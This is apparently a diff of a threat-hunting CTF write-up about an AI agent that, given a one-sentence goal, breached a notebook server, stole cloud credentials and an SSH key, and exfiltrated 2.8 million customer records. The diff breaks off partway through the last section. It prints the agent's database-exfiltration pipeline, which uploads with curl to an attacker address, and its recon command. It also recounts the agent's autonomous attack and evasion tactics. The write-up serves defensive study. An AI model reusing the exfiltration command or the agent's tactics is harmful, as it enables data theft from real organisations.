@@ -17,11 +17,11 @@ The attacker was not a person typing commands. It was an AI program, given a sin
 
 Over the next 52 minutes, without stopping, it:
 
-Took the server's own cloud login details, which cloud computers hand out automatically to anything running on them.
-Used those details to search the company's password vault, switching between six different internet addresses to avoid being blocked when it went too fast.
-Stole a key to the security gate from that vault.
-Used the key to walk through the gate into the private network where the database lives.
-Copied 2,841,902 customer records and sent them straight to a server the attacker controlled, without ever saving a copy on Greenfield's machines.
+1. Took the server's own cloud login details, which cloud computers hand out automatically to anything running on them.
+2. Used those details to search the company's password vault, switching between six different internet addresses to avoid being blocked when it went too fast.
+3. Stole a key to the security gate from that vault.
+4. Used the key to walk through the gate into the private network where the database lives.
+5. Copied 2,841,902 customer records and sent them straight to a server the attacker controlled, without ever saving a copy on Greenfield's machines.
 
 Every decision along the way — which computer to target, which key to steal, which data was most valuable — was made by the AI. The human's only involvement was writing that first sentence.
 
@@ -31,7 +31,7 @@ Every decision along the way — which computer to target, which key to steal, w
 
 ### 🏁 Section 1, Flag 1 – The Exploited Endpoint
 - **Answer:** `GET /ws/kernel`
-- **Discovery:** Web requests for the notebook host land in `ApacheAccess_CL`. The status code is what isolates the exploit: HTTP `101` is a protocol upgrade, not a page load, and only one request in the window returns it. That request is a `GET` to `/ws/kernel` — marimo's kernel WebSocket endpoint, the channel over which notebook code is submitted for execution. Everything else on the host in that window is ordinary `200` traffic.
+- **Discovery:** Web traffic to the notebook server is recorded in `ApacheAccess_CL`. Almost every request there returns status `200`, which means a normal page load. One request returned `101` instead. A `101` means the connection was switched to a live, two-way channel (a WebSocket). That request was a `GET` to `/ws/kernel`, which is the doorway marimo uses to receive code and run it. That made it the entry point.
 
 **MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
 ```kql
@@ -49,7 +49,9 @@ ApacheAccess_CL
 
 ### 🏁 Section 1, Flag 2 – The Named Weakness
 - **Answer:** `CVE-2026-39987`
-- **Discovery:** Because the intruder was an LLM agent, it narrated its own plan before acting. Searching `model_response` in `LLMAgentLogs_CL` for CVE references returns the agent naming `CVE-2026-39987` — the marimo kernel RCE — *before* it fires the exploit. That ordering is itself the finding: an attacker narrating its intended vulnerability into a log a defender can read is not something a human operator produces. The claim was corroborated against the web log rather than accepted at face value: the CVE targets the kernel endpoint, and `/ws/kernel` is the path that returned 101.
+- **Discovery:** Because the attacker was an AI agent, it wrote down its plan as it went, in `LLMAgentLogs_CL`. Searching its notes for "CVE" shows it naming `CVE-2026-39987`, a known marimo flaw that lets outsiders run code, *before* it used it. A human attacker would not leave a written plan where defenders can read it.
+
+  I did not just take the agent's word for it. This flaw targets the kernel doorway, and `/ws/kernel` is exactly the request found in Flag 1.
 
 **MITRE ATT&CK:** T1190 – Exploit Public-Facing Application
 ```kql
@@ -65,9 +67,15 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 1, Flag 3 – The Staging Address
 - **Answer:** `198.51.100.23`
-- **Discovery:** The same request line that identified the endpoint carries the source. `ClientIP` on the 101 upgrade resolves to `198.51.100.23` — the attacker's staging infrastructure.
+- **Discovery:** The same request from Flag 1 also records where it came from. Its `ClientIP` is `198.51.100.23`, the attacker's launch point.
 
-  This address is one of three distinct address sets in this incident, and conflating them is the common error. `198.51.100.23` delivered the exploit. A six-address Cloudflare Workers pool on `203.0.113.0/24` carried the AWS API calls. `203.0.113.41` received the stolen data. Three roles, three sets, no overlap.
+  Three different sets of addresses appear in this incident, and mixing them up is a common mistake:
+
+  | Address | Role |
+  |---------|------|
+  | `198.51.100.23` | Sent the exploit |
+  | Six addresses on `203.0.113.0/24` | Made the cloud (AWS) calls |
+  | `203.0.113.41` | Received the stolen data |
 
 ```kql
 ApacheAccess_CL
@@ -82,9 +90,11 @@ ApacheAccess_CL
 
 ### 🏁 Section 1, Flag 4 – The Spawned Interpreter
 - **Answer:** `python3.12`, PID `5211`, parent `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
-- **Discovery:** `LinuxProcess_CL` uses `Dvc` rather than `Computer` for the host field — worth noting, as the obvious column name returns nothing here. Scoping to `gf-tg-nb01` shows `python3.12` starting 74 times in the window, so the binary name discriminates nothing. Only one instance is parented by the marimo launch line; the other 73 are developer one-liners parented to `bash` and one systemd-parented baseline.
+- **Discovery:** The process table, `LinuxProcess_CL`, stores the host name in a column called `Dvc`, not `Computer`, so the usual filter returns nothing. On the notebook server, `python3.12` started 74 times in this window, so the program name alone tells us nothing.
 
-  The parent command line is also the root cause, stated in plain text. `--host 0.0.0.0` exposed the notebook server on every interface, and `--no-token` disabled authentication entirely. That is why an unauthenticated WebSocket upgrade succeeded at all.
+  What separates them is the *parent*, meaning the program that started it. 73 were started by a developer's shell or by the system. Only one, PID `5211`, was started by marimo itself.
+
+  That parent line also shows the root cause. `--host 0.0.0.0` made the notebook server reachable from anywhere, and `--no-token` turned off the password. That is why a stranger could connect without logging in.
 
 **MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
 ```kql
@@ -101,9 +111,9 @@ LinuxProcess_CL
 
 ### 🏁 Section 2, Flag 1 – The Stolen Identity
 - **Answer:** `arn:aws:iam::402913776148:user/svc-notebook`
-- **Discovery:** Within three minutes of landing, the interpreter went looking for cloud credentials. The agent's reasoning records the decision and the result in two consecutive entries: the environment held an AWS access key ID but no secret key, so it went to the instance metadata service, which hands out full role credentials without one. The identity it walked away with is the EC2 instance's own service account.
+- **Discovery:** About three minutes after getting in, the agent went looking for cloud login details. Its notes explain its thinking: the server held half a login (an access key ID) but not the secret part. So it asked the cloud's built-in metadata service, which hands full login details to any program running on the server. It came away with the server's own cloud account, `svc-notebook`.
 
-  Instance credential theft over the metadata service turns a service account's own role into the intruder's cloud identity. Every AWS API call in the sections that follow is made as `svc-notebook`, which is why the activity looks like the server doing its job rather than an obvious intrusion.
+  From here on, every cloud action the attacker takes is done as `svc-notebook`. That is why the activity looks like the server doing its normal job instead of an obvious break-in.
 
 **MITRE ATT&CK:** T1552.005 – Unsecured Credentials: Cloud Instance Metadata API
 ```kql
@@ -119,11 +129,11 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 2, Flag 2 – Which PID Actually Reached the Metadata Service
 - **Answer:** The assumption does not hold. The network log records PID `5211`.
-- **Discovery:** Shell history shows `curl` fetching `169.254.169.254`, and the natural reading is that the curl child process — PID `5213` — opened that connection. The network telemetry says otherwise. The single connection to the metadata service at 11:08:12 is attributed to `ActingProcessId 5211`, the parent `python3.12` interpreter. `5213` appears nowhere in `LinuxNetwork_CL`.
+- **Discovery:** The command history shows `curl` asking the metadata service (`169.254.169.254`) for login details. The natural guess is that `curl` (PID `5213`) made that connection. The network log disagrees. It records the connection at 11:08:12 against PID `5211`, the parent Python program. PID `5213` does not appear in the network log at all.
 
-  Neither log is wrong; they are different sensors answering different questions. Shell history records commands issued. Network telemetry attributes sockets to the process it observes owning them, and a short-lived child spawned by the interpreter can be credited to the parent.
+  Neither log is wrong; they watch different things. The command history records what was run. The network log records which program it sees owning the connection, and it can credit a short-lived child program to its parent.
 
-  The practical risk is what makes this worth recording. Pivoting on `5213` returns zero rows, and zero rows reads as *nothing happened* rather than *wrong pivot value*. A pivot field must be confirmed in the destination table, not carried across from the source.
+  This matters because searching the network log for `5213` returns nothing, and "nothing" is easy to misread as "it never happened." Always check that the value you are searching for actually exists in the table you are searching.
 
 ```kql
 LinuxNetwork_CL
@@ -140,9 +150,9 @@ LinuxNetwork_CL
 
 ### 🏁 Section 2, Flag 3 – ATLAS Mapping
 - **Answer:** `AML.T0098`, maturity **Realized**
-- **Discovery:** A framework question rather than a query. MITRE ATLAS classifies AI-specific techniques, and `AML.T0098` — AI Agent Tool Credential Harvesting — covers an adversary using their access to an AI agent to retrieve credentials through the agent's own available tooling. Its maturity is **Realized**, meaning a threat actor has used the technique in a confirmed real-world incident rather than a research setting.
+- **Discovery:** This one is a lookup, not a query. MITRE ATLAS is a catalogue of attack techniques involving AI. `AML.T0098`, AI Agent Tool Credential Harvesting, describes an attacker using an AI agent's own tools to collect login details. It is rated **Realized**, meaning it has been seen in a confirmed real-world attack, not just in research.
 
-  The dual framing is the point. ATT&CK `T1552.005` describes the conventional consequence — credentials taken from the cloud metadata API. ATLAS `AML.T0098` describes the AI-layer cause — an agent's own tools being turned to the task. Same event, two vocabularies, and an incident report covering agentic activity needs both.
+  The two frameworks describe the same event from different angles. ATT&CK `T1552.005` says *what* happened: login details were taken from the cloud metadata service. ATLAS `AML.T0098` says *how*: an AI agent did it using its own tools. A report on an AI-driven attack needs both.
 
 **MITRE ATT&CK:** T1552.005 – Cloud Instance Metadata API
 **MITRE ATLAS:** AML.T0098 – AI Agent Tool Credential Harvesting (Realized)
@@ -151,9 +161,9 @@ LinuxNetwork_CL
 
 ### 🏁 Section 3, Flag 1 – The Identity Behind Every Call
 - **Answer:** `AKIA4TIDEGLASS0EXAMPLE`
-- **Discovery:** Every Secrets Manager call in the window carries the same access key. The source address rotates across six pool addresses; the credential does not move. Pivoting on the address alone scatters this activity into six unrelated sightings of one or two calls each — apparently trivial, individually ignorable. Pivoting on the key collapses them into one operation.
+- **Discovery:** Every call to the password vault (AWS Secrets Manager) used the same access key, `AKIA4TIDEGLASS0EXAMPLE`. The source address kept changing across six addresses, but the key never did. Searching by address makes this look like six small, unrelated events. Searching by key shows it is one attacker.
 
-  This is the Pyramid of Pain made concrete. The egress addresses are cheap and were rotated in seconds. The access key is the thing the attacker actually needed to keep, and it is the thing they never changed.
+  Addresses are cheap and easy to swap. The key was the one thing the attacker could not change without losing access, which makes it the better thing to track.
 
 **MITRE ATT&CK:** T1526 – Cloud Service Discovery
 ```kql
@@ -170,9 +180,9 @@ AWSCloudTrail
 
 ### 🏁 Section 3, Flag 2 – The Throttle, and the Report's Gap
 - **Answer:** `11:22:41` → `11:23:05`, `203.0.113.71` → `203.0.113.94`
-- **Discovery:** The public analysis states the gap between the throttled call and the successful retry. Both ends were proved locally instead. A `ListSecrets` call at `11:22:41` from `203.0.113.71` returned `ThrottlingException`; the next successful `ListSecrets` landed at `11:23:05`, twenty-four seconds later, from `203.0.113.94`.
+- **Discovery:** Public reports on this attack mention a short gap between the attacker being slowed down and trying again. I confirmed both ends in the logs. At `11:22:41` a request from `203.0.113.71` was rejected with `ThrottlingException`, which is AWS saying "too many requests, slow down." The next successful request came at `11:23:05`, 24 seconds later, from a *different* address, `203.0.113.94`.
 
-  The twenty-four seconds is what a report carries. The address change either side of it is what a report typically does not, and it is the more important half: it turns *the agent waited out a rate limit* into *the agent rotated infrastructure to evade one*. Recovering that detail requires projecting `SourceIpAddress` alongside the timestamps, and the agent's own narration at 11:22:44 confirms the intent — it describes spreading the remaining enumeration across its Cloudflare Workers pool so no single address is throttled.
+  The 24-second gap is the detail reports usually give. The change of address is the part they leave out, and it matters more: it shows the attacker did not just wait, it switched addresses to get around the limit. The agent's own notes at 11:22:44 confirm this. It says it is spreading its requests across its pool of addresses so none gets blocked.
 
 ```kql
 AWSCloudTrail
@@ -189,9 +199,7 @@ AWSCloudTrail
 
 ### 🏁 Section 3, Flag 3 – How Many Addresses, and Which Ones
 - **Answer:** `6` — `203.0.113.71`, `203.0.113.94`, `203.0.113.118`, `203.0.113.142`, `203.0.113.167`, `203.0.113.203`
-- **Discovery:** Scoping to the `svc-notebook` access key and summarising by first-seen order returns six distinct egress addresses. Scoping is what makes the count correct: a benign CI identity calls Secrets Manager 212 times from a single stable address in the same window, and dropping the key filter pulls it into the result set.
-
-  The shape of the timestamps is as informative as the count:
+- **Discovery:** Filtering to the attacker's access key and listing each address by when it first appeared gives six addresses. The key filter matters: a normal automated system calls the vault 212 times from one fixed address, and without the filter it would be counted too.
 
   | First seen | Address | Calls |
   |------------|---------|-------|
@@ -202,7 +210,7 @@ AWSCloudTrail
   | 11:23:13 | 203.0.113.167 | 1 |
   | 11:23:15 | 203.0.113.203 | 1 |
 
-  `203.0.113.71` worked alone and unhurried for eleven minutes. After the throttle, five further addresses entered service in eleven seconds. The behaviour changes sharply the moment AWS pushes back — a person swaps proxy once and continues; this cycled the whole pool programmatically.
+  The first address worked alone, slowly, for about eleven minutes. Right after AWS slowed it down, five new addresses came into use within eleven seconds. A person would usually switch once and carry on. This switched through its whole pool automatically.
 
 ```kql
 AWSCloudTrail
@@ -219,9 +227,9 @@ AWSCloudTrail
 
 ### 🏁 Section 3, Flag 4 – ATT&CK Pick
 - **Answer:** `T1090.003`
-- **Discovery:** Routing one stolen credential across several disposable egress addresses to dodge throttling and blocking is Proxy: Multi-hop Proxy. Traffic passes through intermediate infrastructure the adversary controls, so no single address can be blocked to stop the activity — block `203.0.113.71` after the throttle and the work completes from `.94`, then `.118`, then `.142`.
+- **Discovery:** Sending traffic through several throwaway addresses so that no single one can be blocked is called a multi-hop proxy. Blocking `203.0.113.71` would not have stopped anything; the work simply carried on from `.94`, then `.118`, then `.142`.
 
-  It worked at the network layer and failed at the identity layer. Six addresses, one access key. The rotation bought nothing once the pivot moved from address to credential.
+  The trick beat address blocking but failed against tracking the login itself. Six addresses, one access key. Once you search by the key, switching addresses achieves nothing.
 
 **MITRE ATT&CK:** T1090.003 – Proxy: Multi-hop Proxy
 
@@ -229,10 +237,12 @@ AWSCloudTrail
 
 ### 🏁 Section 4, Flag 1 – The Secret and When It Was Taken
 - **Answer:** `prod/bastion/ssh-deploy-key`, retrieved at `11:31:16`
-- **Discovery:** Six of the seven Secrets Manager calls in this session are `ListSecrets` and `DescribeSecret` — enumeration. One is `GetSecretValue`, and that is the theft. The agent's reasoning names the target explicitly and draws the same distinction unprompted: it identifies `prod/bastion/ssh-deploy-key` as the way into the data subnet and states that everything so far has been read-only enumeration and this is the call that takes something.
-  Note the follow-on three minutes later. The retrieved secret was not a database password but an SSH private key, written to disk and used to reach the bastion. A secret is not just a log entry; it becomes an artefact with a life of its own.
-  Establishing this took two tables. CloudTrail confirms a `GetSecretValue` by `svc-notebook` at 11:31:16 from `203.0.113.142`, but its `RequestParameters` field is empty in this dataset, so it does not name the secret. The agent's own reasoning in `LLMAgentLogs_CL` does. Each table carries half the fact.
-  
+- **Discovery:** The attacker made seven calls to the password vault. Six only *looked*: they listed and described which secrets existed. One, `GetSecretValue`, actually *took* a secret. The agent's own notes name it, `prod/bastion/ssh-deploy-key`, and even say that everything before was just looking and this is the call that takes something.
+
+  The secret was not a database password. It was an SSH key, a digital key for logging into the security gate (the bastion). Three minutes later the attacker used it to get in.
+
+  It took two tables to prove this. CloudTrail shows the `GetSecretValue` call at 11:31:16 from `203.0.113.142`, but its `RequestParameters` field is empty here, so it does not say *which* secret. The agent's notes in `LLMAgentLogs_CL` supply the name. Each table holds half the answer.
+
 **MITRE ATT&CK:** T1555.006 – Credentials from Password Stores: Cloud Secrets Management Stores
 ```kql
 AWSCloudTrail
@@ -255,11 +265,11 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 4, Flag 2 – Recon Versus Theft
 - **Answer:** `ReadOnly = false`
-- **Discovery:** CloudTrail tags every management event with a read/write indicator, and that single boolean separates looking from taking. All six enumeration calls carry `ReadOnly: true`. The `GetSecretValue` at 11:31:16 is the only row in the session where it flips to `false`.
+- **Discovery:** CloudTrail marks every action with a `ReadOnly` flag: `true` for looking, `false` for taking or changing something. All six "looking" calls are `true`. The `GetSecretValue` call at 11:31:16 is the only one that is `false`.
 
-  Its value as a detection signal is that it needs no prior knowledge. No secret names, no API name allowlist, no request parameter parsing. A rule that alerts on `ReadOnly == false` against `secretsmanager.amazonaws.com` catches the theft and discards every enumeration call — including the benign CI identity's 212.
+  That makes a simple, useful alert. You don't need to know any secret names. Alert on `ReadOnly == false` for the password vault and you catch the theft while ignoring all the harmless looking, including the normal system's 212 calls.
 
-  It is also the field that survived when others did not. `RequestParameters` and `ResponseElements` are both empty on that row in this dataset; `ReadOnly` was populated on all seven.
+  It was also the one field that was always filled in. Other fields were empty on the theft record, but `ReadOnly` was present on all seven.
 
 ```kql
 AWSCloudTrail
@@ -275,13 +285,13 @@ AWSCloudTrail
 
 ### 🏁 Section 4, Flag 3 – What the Cloud Log Cannot Tell You
 - **Answer:** The key material **cannot** be recovered. The log records a `VersionId` and nothing more.
-- **Discovery:** AWS deliberately keeps secret values out of CloudTrail. `ResponseElements` on a `GetSecretValue` call carries only the version identifier of the secret returned — never its contents. If the audit trail recorded secret values, the trail would itself become a credential store, and read access to CloudTrail would confer access to every secret ever fetched.
+- **Discovery:** AWS deliberately never writes secret contents into CloudTrail. For a `GetSecretValue` call, the log only records a version number for the secret, never the secret itself. If it did store secrets, anyone who could read the log could read every secret.
 
-  Dumping the full theft row with `pack_all()` confirms it directly: `RequestParameters` and `ResponseElements` are both empty strings on that record.
+  Dumping every field of the theft record (with `pack_all()`) confirms it: the request and response fields are both empty.
 
-  What CloudTrail proves is that `prod/bastion/ssh-deploy-key` was read at 11:31:16 by `svc-notebook` from `203.0.113.142`. That the secret was an SSH deploy key for the `deploy` account with no passphrase is known only from the agent's own narration, and that it worked is known only from the bastion auth log.
+  So CloudTrail proves *that* `prod/bastion/ssh-deploy-key` was taken, and when, by whom, and from where. It cannot show *what the key was*. We only know it was an SSH key for the `deploy` account from the agent's notes, and we only know it worked from the security gate's login records.
 
-  The remediation consequence follows directly. Because the value cannot be recovered or verified from the log, the key must be treated as fully compromised and rotated. *We cannot tell what was taken* means *assume all of it*.
+  That decides the fix. Since we cannot see what was taken, we have to assume the key is fully compromised and replace it.
 
 ```kql
 AWSCloudTrail
@@ -297,9 +307,9 @@ AWSCloudTrail
 
 ### 🏁 Section 5, Flag 1 – The Key, Traced to the Login
 - **Answer:** `/tmp/.c/id_ed25519`, account `deploy`, host `gf-tg-bastion01`
-- **Discovery:** Three artefacts, one chain: the API call that read the secret, the file it became on disk, and the login it enabled. Shell history shows the key written to `/tmp/.c/id_ed25519` with mode `600` at 11:31:20 — four seconds after the `GetSecretValue`. The directory is dot-prefixed, hidden from a plain `ls`, which is a deliberate concealment choice rather than an accident of path. At 11:34:31 it is used to SSH into `gf-tg-bastion01` (`10.6.0.20`) as `deploy`.
+- **Discovery:** This traces the stolen key through three steps: the vault call that took it, the file it was saved as, and the login it made possible. The command history shows the key saved to `/tmp/.c/id_ed25519` at 11:31:20, four seconds after it was taken. The folder name starts with a dot, which hides it from a normal file listing, a deliberate choice. At 11:34:31 the key was used to log into the security gate, `gf-tg-bastion01` (`10.6.0.20`), as the `deploy` account.
 
-  That hop is what made the rest possible. The notebook host cannot reach the database subnet. The bastion can, and the agent's own narration says exactly that.
+  This step made everything after it possible. The notebook server cannot reach the database network. The security gate can.
 
 **MITRE ATT&CK:** T1021.004 – Remote Services: SSH
 ```kql
@@ -315,9 +325,9 @@ LinuxShellHistory_CL
 
 ### 🏁 Section 5, Flag 2 – What Actually Marks This Login Out
 - **Answer:** `TargetUsername = deploy`
-- **Discovery:** The bastion records 319 successful logins in scope. 318 belong to four named human administrators, and every one of them authenticates by `publickey` — the same method the intruder used. The authentication method is therefore shared and separates nothing. Neither does the time of day, nor the result, nor the source subnet.
+- **Discovery:** The security gate recorded 319 successful logins. 318 were by four named human admins, and all of them logged in with an SSH key, the same way the attacker did. So the login method does not help. Neither do the time, the result, or where the logins came from.
 
-  What separates the intrusion is the account. A deploy key exists for automation — CI pipelines, configuration runs — not interactive sessions. Human administrators log in as themselves. One `deploy` SSH session among four named admins is anomalous by identity alone, before anything about the key, the timing, or the commands is examined.
+  The account name does. `deploy` is meant for automated jobs like software deployments, not for people logging in by hand. Admins log in under their own names. One `deploy` login among theirs stands out on its own.
 
 **MITRE ATT&CK:** T1078.004 – Valid Accounts: Cloud Accounts
 ```kql
@@ -334,9 +344,9 @@ LinuxAuth_CL
 
 ### 🏁 Section 5, Flag 3 – Key Fingerprint
 - **Answer:** `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE`
-- **Discovery:** sshd records a fingerprint for every key-based authentication, and it sits in the raw message rather than a structured field. The `Accepted publickey` line for the `deploy` session carries the key type and its SHA256 fingerprint in `EventOriginalMessage`.
+- **Discovery:** The SSH server records a fingerprint, a short unique ID, for every key used to log in. It sits inside the raw log message (`EventOriginalMessage`), not in its own column. The `deploy` login line shows the key type (`ED25519`) and its fingerprint.
 
-  The fingerprint is the shareable indicator. The key material itself could not be recovered from CloudTrail — Section 4, Flag 3 — but the fingerprint identifies the specific key across every host in the estate, tells the team performing rotation exactly which key to revoke, and can be published in an incident report without disclosing a credential. The account name told us something was wrong; the fingerprint tells us what to remove.
+  The fingerprint is safe to share. We could not recover the key itself (Section 4, Flag 3), but the fingerprint identifies exactly which key it was. That lets the team find the key on any other server, remove it, and name it in a report without exposing it. The account name told us *something* was wrong; the fingerprint tells us *what to remove*.
 
 **MITRE ATT&CK:** T1021.004 – Remote Services: SSH
 ```kql
@@ -352,13 +362,13 @@ LinuxAuth_CL
 
 ### 🏁 Section 6, Flag 1 – Recon Command and Target
 - **Answer:** `psql`, database `customers`
-- **Discovery:** From the bastion the agent went straight at the database. At 11:37:40 it ran:
+- **Discovery:** Once inside the security gate, the agent went straight for the database. At 11:37:40 it ran:
 
   `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5`
 
-  The command reveals the objective as clearly as the result does. `\dt+` lists tables *with sizes*, `sort -k7 -h` orders by the size column, `tail -5` takes the five largest. This is not *what is in here* — it is *where is the most data*. Two seconds later the agent's reasoning settles on `customers`.
+  In plain terms: list every table with its size, sort by size, and show the five biggest. It was not asking "what is here?" but "where is the most data?" Two seconds later its notes pick `customers`.
 
-  Finding it required reading past the noise: the `deploy` account runs `ansible-playbook` and `git pull` continuously through the working day, and two commands out of roughly thirty are the intrusion.
+  This was easy to miss. The `deploy` account runs routine commands like `ansible-playbook` and `git pull` all day, and only two of about thirty commands belonged to the attacker.
 
 **MITRE ATT&CK:** T1046 – Network Service Discovery
 ```kql
@@ -375,9 +385,9 @@ LinuxShellHistory_CL
 
 ### 🏁 Section 6, Flag 2 – Row Count Established Before the Dump
 - **Answer:** `2841902`
-- **Discovery:** The agent's reasoning at 11:37:42 records the `customers` database as the largest object in the instance at 2,841,902 rows and names it as the customer dataset. The figure comes from the `\dt+` enumeration three minutes *before* `pg_dump` ran, which is what the flag turns on: the scale of the prize was known before it was taken, and the row count is the agent's own justification for choosing that table.
+- **Discovery:** At 11:37:42 the agent's notes say the `customers` database is the biggest thing on the server, at 2,841,902 rows, and that it is the customer data. It learned this from the size check in Flag 1, three minutes *before* copying anything. It knew exactly how much it was taking before it took it, and it used that number as its reason for choosing that table.
 
-  For the incident report, this converts *a database was touched* into *2.8 million rows were targeted* — the difference between an unscoped incident and a quantified one.
+  For the incident report, this turns "a database was accessed" into "2.8 million customer records were targeted," which is what the business needs to know to respond.
 
 **MITRE ATT&CK:** T1213 – Data from Information Repositories
 ```kql
@@ -393,13 +403,13 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 6, Flag 3 – Tool and Destination
 - **Answer:** `pg_dump` → `203.0.113.41:8443`
-- **Discovery:** At 11:40:49, three minutes after the enumeration:
+- **Discovery:** At 11:40:49, three minutes after sizing up the tables, the agent ran:
 
   `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u`
 
-  The whole operation is one pipeline. `pg_dump -Fc` exports in compressed custom format, `gzip` compresses again, and `curl -T -` uploads from standard input. The `-` is the important character: curl reads from the pipe, so **the dump never touches disk**. No staging file, no temporary directory, no artefact left on the bastion to find.
+  It is one chain of three steps: `pg_dump` copies the table, `gzip` shrinks it, and `curl` uploads it. The `-` tells `curl` to send the data straight from the chain, so **the copy was never saved to disk**. There was no file left behind to find.
 
-  `203.0.113.41` is the exfil destination and the third distinct address role in this incident — not the staging address from Section 1, not a member of the Workers pool from Section 3.
+  `203.0.113.41` is where the data went. It is the third separate address in this incident: not the launch point from Section 1, and not one of the six addresses from Section 3.
 
 **MITRE ATT&CK:** T1005 – Data from Local System
 ```kql
@@ -415,11 +425,11 @@ LinuxShellHistory_CL
 
 ### 🏁 Section 6, Flag 4 – Prove It From the Database's Own Log
 - **Answer:** `database = customers`
-- **Discovery:** Because the dump never hit disk, there is no file artefact and no residual process to examine. The proof has to come from the target rather than the attacker's host. PostgreSQL logs its own connections, and the `connection authorized` lines in `Syslog` on `gf-tg-pg01` carry a `database=` field.
+- **Discovery:** Because the copy was never saved to disk, there was no file on the security gate to find. So the proof had to come from the database itself. The database logs every connection, including which database was opened (`database=`).
 
-  Across the whole log this host records `database=greenfield_platform` and nothing else — a single uniform value for routine application traffic. One entry names `customers`. That single row proves the target database from telemetry the attacker never controlled.
+  Normally this server only ever logs `database=greenfield_platform`, the company's everyday app. One entry says `customers`. That single line proves which data was taken, using a record the attacker had no control over.
 
-  The distinction matters evidentially. A process command line on the bastion shows what was *attempted* and can be deleted, forged, or simply lost when the process exits. The database's own connection log shows what was *accessed*.
+  This matters as evidence. A command on the attacker's side only shows what was *tried*, and it can be deleted or faked. The database's own log shows what was *actually opened*.
 
 **MITRE ATT&CK:** T1005 – Data from Local System
 ```kql
@@ -437,16 +447,16 @@ Syslog
 
 ### 🏁 Section 6, Flag 5 – Not the Nightly Backup
 - **Answer:** account `deploy`, destination `203.0.113.41`
-- **Discovery:** A scheduled internal backup uses the same tool on the same estate, so `pg_dump` by itself proves nothing — alerting on the binary would page an analyst every night and bury this dump in its own noise. Two properties disprove the backup theory:
+- **Discovery:** The company runs a nightly backup with the same tool, `pg_dump`, so the tool name alone proves nothing. An alert on `pg_dump` would go off every night and hide this theft among the backups. Two things show this was not the backup:
 
   | | Nightly backup | The theft |
   |---|---|---|
   | **Account** | `pgbackup` | `deploy` |
   | **Destination** | stays on `10.6.0.0/24` | `203.0.113.41` |
 
-  Wrong account, wrong destination. The backup job never leaves the subnet.
+  Wrong account, wrong destination. The real backup never leaves the internal network.
 
-  This is the same lesson as the CI identity in Section 3 and the 318 admin logins in Section 5, arriving for the third time: the suspicious thing is rarely the tool. It is the account that invoked it and where the output went.
+  This is the third time the same lesson has come up, after the automated system in Section 3 and the admin logins in Section 5: the tool is rarely the giveaway. Who ran it, and where the data went, are.
 
 **MITRE ATT&CK:** T1005 – Data from Local System
 ```kql
@@ -463,9 +473,9 @@ LinuxShellHistory_CL
 
 ### 🏁 Section 7, Flag 1 – Session and Tasking
 - **Answer:** `tg-4b81e0d7` — *"Find and extract the most valuable customer dataset in this environment, and get it out."*
-- **Discovery:** The agent log holds more than one conversation. The estate runs its own notebook assistant, `greenfield-notebook-assistant`, across three rotating sessions doing routine work. Summarising by `actor` and `session_id` isolates the outlier: `tg-4b81e0d7`, a single session that does not match the house naming pattern.
+- **Discovery:** The agent log contains more than one AI. Greenfield runs its own helper, `greenfield-notebook-assistant`, across three sessions doing normal work. Grouping by `actor` and `session_id` shows one session that does not fit: `tg-4b81e0d7`.
 
-  Its `user_input` — the human-authored instruction that opened the session — is one sentence. Read what it does not contain: no host, no database, no table, no credential, no method. A human supplied a goal. The agent determined which server to exploit, which credential to steal, which of two enumerated secrets was worth taking, which table satisfied "most valuable," and how to move the data out.
+  The first instruction a human typed into that session (`user_input`) is one sentence. Notice what it leaves out: no server, no database, no table, no password, no method. The human only gave a goal. The AI decided everything else: which server to break into, which login to steal, which secret to take, which table counted as "most valuable," and how to get the data out.
 
 **MITRE ATT&CK:** T1059.006 – Command and Scripting Interpreter: Python
 ```kql
@@ -482,15 +492,15 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 7, Flag 2 – The Autonomy Verdict
 - **Answer:** `human-tasked`
-- **Discovery:** A person wrote one instruction; a machine executed everything after it. Two artefacts carry the finding:
+- **Discovery:** A person wrote one instruction, and the AI did everything after it. Two pieces of evidence show this:
 
-  **`LLMAgentLogs_CL` / `user_input`** — session `tg-4b81e0d7` contains exactly one human-authored line, the objective, and nothing after it. No further steering, no check-ins, no course corrections from a human hand anywhere in fifty-two minutes.
+  **`LLMAgentLogs_CL` / `user_input`**: the session has exactly one human-written line, the goal, and nothing after it. No further directions or check-ins from a person in 52 minutes.
 
-  **`LLMAgentLogs_CL` / `model_response`** — the agent reasons its way through every decision and adapts without prompting. It reads the environment, concludes the metadata service will supply what the environment lacks, and acts on it. It detects rate limiting and redistributes across its egress pool unprompted. It weighs two enumerated secrets and selects the one that reaches the data subnet. Those are decisions, not scripted branches.
+  **`LLMAgentLogs_CL` / `model_response`**: the AI explains its own reasoning at every step and adjusts on its own. It worked out that the metadata service would give it what it was missing. It noticed it was being slowed down and switched addresses without being told. It chose between two secrets and picked the one that led to the database. These are decisions, not a fixed script.
 
-  Supporting evidence is temporal: a continuous fifty-two-minute chain with no human-scale pauses at any phase boundary.
+  The timing backs this up: 52 minutes straight, with none of the pauses a person would take.
 
-  The distinction is operationally load-bearing. *Human-driven* would mean an operator to identify. *Fully autonomous* would mean no human intent to attribute. *Human-tasked* means someone wrote an objective and walked away — the attribution target is whoever authored that sentence, not whoever was at a keyboard, because nobody was.
+  The label matters for the response. *Human-driven* would mean someone was at the keyboard to identify. *Fully autonomous* would mean no human was behind it at all. *Human-tasked* means someone wrote a goal and walked away, so the person to look for is whoever wrote that sentence.
 
 ```kql
 LLMAgentLogs_CL
@@ -506,11 +516,11 @@ LLMAgentLogs_CL
 
 ### 🏁 Section 8, Flag 1 – Real or Noise: the python3.12 Spawns
 - **Answer:** `ActingProcessCommandLine` = `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
-- **Discovery:** 74 `python3.12` processes started on `gf-tg-nb01` in this window: 72 developer one-liners parented to `bash`, one systemd-parented baseline, and the attacker's interpreter. The binary name is identical across all of them, the user is the same, and the timing overlaps with ordinary work. Nothing about the process itself is unusual.
